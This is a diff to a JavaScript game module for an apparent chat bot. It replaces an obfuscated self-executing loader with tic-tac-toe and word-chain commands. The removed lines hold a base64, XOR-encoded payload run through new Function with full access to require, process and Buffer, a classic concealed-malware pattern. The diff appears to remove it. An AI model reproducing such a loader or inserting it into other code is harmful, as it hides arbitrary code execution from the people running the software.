@@ -1,9 +1,156 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const U = require('../lib/util');
+const { UserError, bold } = U;
+
+const NUM = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
+const LINES = [[0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6]];
+const winner = b => { for (const [x, y, z] of LINES) if (b[x] && b[x] === b[y] && b[x] === b[z]) return b[x]; return null; };
+const render = b => [0, 3, 6].map(r => [0, 1, 2].map(c => { const v = b[r + c]; return v === 'X' ? '❌' : v === 'O' ? '⭕' : NUM[r + c]; }).join(' ')).join('\n');
+function minimax(b, turn, me) {
+  const w = winner(b);
+  if (w) return { score: w === me ? 10 : -10 };
+  const free = b.map((v, i) => (v ? null : i)).filter(i => i !== null);
+  if (!free.length) return { score: 0 };
+  let best = null;
+  for (const i of free) {
+    b[i] = turn;
+    const s = minimax(b, turn === 'X' ? 'O' : 'X', me).score;
+    b[i] = null;
+    if (best === null || (turn === me ? s > best.score : s < best.score)) best = { score: s, move: i };
+  }
+  return best;
+}
+
+const dictCache = new Map();
+async function isWord(w) {
+  w = w.toLowerCase();
+  if (dictCache.has(w)) return dictCache.get(w);
+  try {
+    const res = await fetch('https://api.dictionaryapi.dev/api/v2/entries/en/' + encodeURIComponent(w), { signal: AbortSignal.timeout(8000) });
+    if (res.status === 404) { dictCache.set(w, false); return false; }
+    if (res.ok) { dictCache.set(w, true); return true; }
+  } catch {}
+  return /^[a-z]{3,}$/.test(w) && /[aeiouy]/.test(w); // dictionary unreachable: accept plausible words
+}
+
+const board = g => Object.values(g.scores).sort((a, b) => b.n - a.n).map((s, i) => `${['🥇', '🥈', '🥉'][i] || '▫️'} ${s.name || s.id}: ${bold(String(s.n))}`).join('\n') || 'Nobody scored.';
+const FRAGMENTS = ['str', 'tra', 'pre', 'con', 'com', 'sta', 'pro', 'ter', 'dis', 'sho', 'cha', 'bri', 'gra', 'spe', 'har', 'wor', 'mon', 'for'];
+
+module.exports = ({ def, hooks, tickers }) => {
+  /* --------------------------- tic tac toe ---------------------------- */
+  def(['tictactoe', 'ttt'], { cat: 'game', usage: 'tictactoe @opponent | tictactoe (in private: play the bot) | tictactoe end', desc: 'Play Tic-Tac-Toe. Send a number 1-9 to place your mark.' }, async ctx => {
+    const g = ctx.rt.games.get(ctx.chat);
+    if (/^(end|stop)$/i.test(ctx.argv[0] || '')) {
+      if (!g || g.type !== 'ttt') throw new UserError('No Tic-Tac-Toe game is running here.');
+      ctx.rt.games.delete(ctx.chat);
+      return ctx.reply('🏁 Game ended.');
+    }
+    if (g) throw new UserError(`A ${g.type === 'ttt' ? 'Tic-Tac-Toe' : 'word'} game is already running here. Finish it first (${ctx.var('PREFIX')}${g.type === 'ttt' ? 'tictactoe' : g.type} end).`);
+    let opp = null;
+    const t = ctx.isGroup ? ctx.targets()[0] : null;
+    if (t) { opp = { id: ctx.jidUser(t), jid: t, name: '@' + ctx.jidUser(t) }; if (ctx.botIds().includes(opp.id) || opp.id === ctx.senderNum) throw new UserError('Pick someone else to play against.'); }
+    else if (!ctx.isGroup || /bot/i.test(ctx.args)) opp = { id: 'bot', name: 'Bot' };
+    else throw new UserError(`Mention your opponent: *${ctx.var('PREFIX')}tictactoe @friend* — or add *bot* to play me.`);
+    const game = { type: 'ttt', board: Array(9).fill(null), X: { id: ctx.senderNum, name: ctx.name || '+' + ctx.senderNum }, O: opp, turn: 'X', deadline: Date.now() + 5 * 60000 };
+    ctx.rt.games.set(ctx.chat, game);
+    await ctx.send({ text: ctx.frame(`❌ ${bold(game.X.name)}  vs  ⭕ ${bold(opp.name)}\n\n${render(game.board)}\n\n${game.X.name} starts. Send a number *1-9*.`, { title: 'Tic-Tac-Toe' }), mentions: opp.jid ? [opp.jid] : [] }, { quoted: ctx.msg });
+  });
+
+  /* ------------------------ word chain game --------------------------- */
+  def('wcg', { cat: 'game', group: true, usage: 'wcg • wcg end • wcg score', desc: 'Word Chain Game: each word must start with the last letter of the previous word. 60 seconds per word.' }, async ctx => {
+    const g = ctx.rt.games.get(ctx.chat);
+    const a = (ctx.argv[0] || '').toLowerCase();
+    if (a === 'end' || a === 'stop') {
+      if (!g || g.type !== 'wcg') throw new UserError('No word chain game is running.');
+      ctx.rt.games.delete(ctx.chat);
+      return ctx.reply(`🏁 ${bold('Game over!')}\n\n${board(g)}`, { title: 'Word Chain' });
+    }
+    if (a === 'score') {
+      if (!g || g.type !== 'wcg') throw new UserError('No word chain game is running.');
+      return ctx.reply(board(g), { title: 'Scores' });
+    }
+    if (g) throw new UserError('A game is already running here.');
